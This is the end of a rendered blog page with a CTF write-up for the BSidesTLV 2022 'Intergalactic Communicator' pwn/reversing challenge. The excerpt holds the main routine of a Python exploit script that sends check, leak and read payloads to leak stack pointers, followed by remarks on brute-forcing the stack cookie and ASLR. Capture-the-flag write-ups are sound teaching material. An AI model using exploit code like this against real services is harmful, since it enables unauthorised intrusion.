boolean\",children:\"None\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"        \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"try\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"            sock \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" socket\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"create_connection\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"ip\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" port\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"        \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"except\"}),\" ConnectionRefusedError\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"            \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"continue\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"return\"}),` sock\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token keyword\",children:\"def\"}),\" \",(0,n.jsx)(e.span,{className:\"token function\",children:\"main\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    conn \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" get_connection\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"server\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" port\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"try\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"        \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"# Checking for welcome message\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"        \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"if\"}),\" \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"not\"}),\" send_exploit\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"conn\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" check\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token boolean\",children:\"True\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token boolean\",children:\"True\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"            conn\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"close\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"            sys\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"exit\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"1\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"        \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"# Sending leak payload\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"        send_exploit\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"conn\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" leak\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token boolean\",children:\"True\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"        \",(0,n.jsx)(e.span,{className:\"token comment\",children:\"# Checking if leaked pointers\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"        \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"if\"}),\" \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"not\"}),\" send_exploit\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"conn\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" read\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,n.jsx)(e.span,{className:\"token boolean\",children:\"True\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"            conn\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"close\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"            sys\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"exit\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"1\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"except\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"        conn\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"close\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"        sys\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"exit\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"1\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    conn\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"close\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    sys\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),\"exit\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"0\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token keyword\",children:\"if\"}),\" __name__ \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"==\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'__main__'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    main\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]})]})}),`\n`,(0,n.jsxs)(e.h2,{id:\"final-remarks\",children:[(0,n.jsx)(e.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#final-remarks\",children:(0,n.jsx)(e.span,{className:\"icon icon-link\"})}),\"Final remarks\"]}),`\n`,(0,n.jsx)(e.p,{children:`The challenge was statically compiled and stripped, which is just an artificial\nincrease in difficulty, in the end there was nothing in this challenge which made\nit worth the 500 points it was (in my opinion). But people couldn't solve it\n(probably also due to the reversing part), which makes the authors believe they\nactually made a hard challenge.`}),`\n`,(0,n.jsx)(e.p,{children:`This is not the case, this challenge was pretty easy once I had the packet sending\ndone, I just had to find a bunch of offsets and was done. Also the intended solution\nfor the pwn part was ridiculous, I don't want to bruteforce 16000 to 20000 attempts\njust to get ascii (and non-null) stack cookie \u0026 aslr base, that is not fun to exploit\non a remote system where every connection takes way longer than locally.`}),`\n`,(0,n.jsx)(e.p,{children:\"TLDR: pwn too easy, rev cancer.\"})]})}}var g=w;return y;})();\n;return Component;","toc":[{"value":"Intergalactic Communicator (500)","url":"#intergalactic-communicator-500","depth":2},{"value":"Part 1: Reversing","url":"#part-1-reversing","depth":2},{"value":"Header \u0026 checksum","url":"#header--checksum","depth":3},{"value":"API","url":"#api","depth":3},{"value":"Implementation","url":"#implementation","depth":3},{"value":"Part 2: Pwn","url":"#part-2-pwn","depth":2},{"value":"Links","url":"#links","depth":2},{"value":"Healthcheck","url":"#healthcheck","depth":2},{"value":"Final remarks","url":"#final-remarks","depth":2}],"frontMatter":{"readingTime":{"text":"16 min read","minutes":15.015,"time":900900,"words":3003},"slug":"bsidestlv-2022/intergalactic_communicator","fileName":"bsidestlv-2022/intergalactic_communicator.md","title":"BSidesTLV 2022 CTF – Intergalactic Communicator","date":"2022-06-30T00:00:00.000Z","draft":false,"authors":["thebadgod"],"tags":["BSidesTLV 2022","pwn","reverse","rc4"],"summary":"pwn too easy, rev cancer.","canonical":"https://spclr.ch/bsidestlv2022-writeups"}},"authorDetails":[{"readingTime":{"text":"1 min read","minutes":0.2,"time":12000,"words":40},"slug":["thebadgod"],"fileName":"thebadgod.md","name":"TheBadGod","avatar":"https://www.gravatar.com/avatar/17fe95d3ab94df64d28ff20042e58df3?d=identicon\u0026s=256","specialties":["Reverse","Pwn","Web"],"github":"https://github.com/TheBadGod/","twitter":"https://twitter.com/HodelAaron","web":"https://spclr.ch/","linkedin":"https://www.linkedin.com/in/aaron-hodel-17a77415a/","member":true,"description":"I do rev, also sometimes studying.","order":12,"date":null}],"prev":{"title":"BSidesTLV 2022 CTF – Code is Law","date":"2022-06-29T00:00:00.000Z","draft":false,"authors":["yanhu"],"tags":["BSidesTLV 2022","Blockchain","Solidity","Smart Contract","Web3"],"summary":"Modify contract storage using hardhat_setStorageAt.","canonical":"https://yanhuijessica.github.io/Chictf-Writeups/blockchain/code_is_law","slug":"bsidestlv-2022/code_is_law"},"next":{"title":"BSidesTLV 2022 CTF – SEV","date":"2022-07-01T00:00:00.000Z","draft":false,"authors":["radewoosh"],"tags":["BSidesTLV 2022","Crypto","ECC","Elliptic Curve"],"summary":"Steal secret key and get the flag.","slug":"bsidestlv-2022/sev"}},"__N_SSG":true},"page":"/blog/[...slug]","query":{"slug":["bsidestlv-2022","intergalactic_communicator"]},"buildId":"qjVMIloeGVfOBGlHlZkTe","isFallback":false,"gsp":true,"scriptLoader":[]}</script></body></html>